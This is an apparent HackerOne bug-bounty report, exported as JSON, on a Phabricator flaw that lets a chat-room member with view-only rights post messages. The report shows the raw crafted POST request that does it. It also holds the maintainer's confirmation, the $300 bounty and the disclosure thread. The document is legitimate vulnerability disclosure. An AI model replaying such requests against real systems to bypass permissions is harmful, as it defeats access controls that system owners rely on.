{"id":202499,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDI0OTk=","url":"https://hackerone.com/reports/202499","title":"User with only Viewing Privilege can send message to Room","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-02-01T00:53:23.818Z","submitted_at":"2017-02-01T00:53:23.818Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"lucasveigaf","url":"/lucasveigaf","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":18,"url":"https://hackerone.com/phabricator","handle":"phabricator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Phabricator","twitter_handle":"phabricator","website":"http://phacility.com/phabricator/","about":"Phabricator is a collection of open source web applications that help software companies build better software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-02-01T03:41:01.357Z","bug_reporter_agreed_on_going_public_at":"2017-02-01T03:41:01.309Z","team_member_agreed_on_going_public_at":"2017-02-01T01:14:07.405Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey, mongoose\n\nWhen the owner of a chat room gives any user Viewing Privilege, that user can then send messages to the room. As expected, there's no form to send messages when the user access the room since in theory it shouldn't be possible. However, messages via POST requests can still be sent and processed.\n\nThe Severity of this issue is marked as low, but it still can be a serious problem depending on the scenario.\n\nSteps to reproduce\n====================\n\n1. Create a new room\n2. Give **only** Viewing Privilege to a user or all users\n3. Send the following POST as the user with Viewing Privilege only\n4. Refresh browser and see the message sent\n\n```\nPOST /conpherence/update/1/ HTTP/1.1\nHost: 192.168.25.10\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Phabricator-Csrf: B@6uaixbh422c60ea95853fee4\nX-Phabricator-Via: /\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\nCookie: phsid=35yvcfc22xj27th6hwawazghx5cnritidfccxdhh; phusr=lucasveiga\nConnection: close\n\n__form__=1\u0026action=message\u0026text=TESTTEXT\u0026latest_transaction_id=10\u0026__wflow__=true\u0026__ajax__=true\u0026__metablock__=6\n```\n\nThis isn't session related since logging in and out doesn't affect anything. Just replace \"X-Phabricator-Csrf\" and \"phsid\" with the new ones and the message still will be sent.\n\nLet me know if you need further information. ","vulnerability_information_html":"\u003cp\u003eHey, mongoose\u003c/p\u003e\n\n\u003cp\u003eWhen the owner of a chat room gives any user Viewing Privilege, that user can then send messages to the room. As expected, there\u0026#39;s no form to send messages when the user access the room since in theory it shouldn\u0026#39;t be possible. However, messages via POST requests can still be sent and processed.\u003c/p\u003e\n\n\u003cp\u003eThe Severity of this issue is marked as low, but it still can be a serious problem depending on the scenario.\u003c/p\u003e\n\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h1\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a new room\u003c/li\u003e\n\u003cli\u003eGive \u003cstrong\u003eonly\u003c/strong\u003e Viewing Privilege to a user or all users\u003c/li\u003e\n\u003cli\u003eSend the following POST as the user with Viewing Privilege only\u003c/li\u003e\n\u003cli\u003eRefresh browser and see the message sent\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /conpherence/update/1/ HTTP/1.1\nHost: 192.168.25.10\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Phabricator-Csrf: B@6uaixbh422c60ea95853fee4\nX-Phabricator-Via: /\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\nCookie: phsid=35yvcfc22xj27th6hwawazghx5cnritidfccxdhh; phusr=lucasveiga\nConnection: close\n\n__form__=1\u0026amp;action=message\u0026amp;text=TESTTEXT\u0026amp;latest_transaction_id=10\u0026amp;__wflow__=true\u0026amp;__ajax__=true\u0026amp;__metablock__=6\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis isn\u0026#39;t session related since logging in and out doesn\u0026#39;t affect anything. Just replace \u0026quot;X-Phabricator-Csrf\u0026quot; and \u0026quot;phsid\u0026quot; with the new ones and the message still will be sent.\u003c/p\u003e\n\n\u003cp\u003eLet me know if you need further information. \u003c/p\u003e\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-03T01:14:07.459Z","allow_singular_disclosure_after":-120713984.27964197,"singular_disclosure_allowed":true,"vote_count":14,"voters":["jon_bottarini","supernatural","mpz","eveeez","mantis","paresh_parmar","arrch","japz","spetr0x","atik-rahman","and 4 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1455332,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, this reproduces for me. I've filed it upstream here:\n\nhttps://secure.phabricator.com/T12178\n\nI'm going to mark this report resolved so we can award you, even though we haven't actually fixed the issue -- it might take a while to get around to it because the severity is so low.\n\nPossibly, we might fix it by removing the \"Can Join\" permission, and just letting anyone who can see a room join it, but we'd have to look at how that impacts other product decisions.","markdown_message":"\u003cp\u003eThanks, this reproduces for me. I\u0026#39;ve filed it upstream here:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://secure.phabricator.com/T12178\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FT12178\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/T12178\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m going to mark this report resolved so we can award you, even though we haven\u0026#39;t actually fixed the issue -- it might take a while to get around to it because the severity is so low.\u003c/p\u003e\n\n\u003cp\u003ePossibly, we might fix it by removing the \u0026quot;Can Join\u0026quot; permission, and just letting anyone who can see a room join it, but we\u0026#39;d have to look at how that impacts other product decisions.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-01T01:11:54.913Z","updated_at":"2017-02-01T01:11:54.913Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"lucasveigaf","url":"/lucasveigaf"},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1455334,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"In assessing an award for this issue, I am primarily considering the low severity of the attack in realistic scenarios.","markdown_message":"\u003cp\u003eIn assessing an award for this issue, I am primarily considering the low severity of the attack in realistic scenarios.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-01T01:13:26.204Z","updated_at":"2017-02-01T01:13:26.204Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Phabricator"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"phabricator","collaborator":{"username":"lucasveigaf","url":"/lucasveigaf"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1455337,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Public details are now available in the upstream, so this can be publicly disclosed at any time.\n\nThanks for the report! Let us know if you find anything else.","markdown_message":"\u003cp\u003ePublic details are now available in the upstream, so this can be publicly disclosed at any time.\u003c/p\u003e\n\n\u003cp\u003eThanks for the report! Let us know if you find anything else.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-01T01:14:07.420Z","updated_at":"2017-02-01T01:14:07.420Z","first_to_agree":true,"actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1455453,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That makes sense to me. I can't see many scenarios where it would be useful to let someone see messages but not send them.\n\nThanks for the rapid response and for the award! ","markdown_message":"\u003cp\u003eThat makes sense to me. I can\u0026#39;t see many scenarios where it would be useful to let someone see messages but not send them.\u003c/p\u003e\n\n\u003cp\u003eThanks for the rapid response and for the award! \u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-01T03:08:08.530Z","updated_at":"2017-02-01T03:08:08.530Z","actor":{"username":"lucasveigaf","cleared":false,"url":"/lucasveigaf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1455469,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-01T03:41:01.327Z","updated_at":"2017-02-01T03:41:01.327Z","actor":{"username":"lucasveigaf","cleared":false,"url":"/lucasveigaf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1455470,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-01T03:41:01.374Z","updated_at":"2017-02-01T03:41:01.374Z","actor":{"username":"lucasveigaf","cleared":false,"url":"/lucasveigaf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}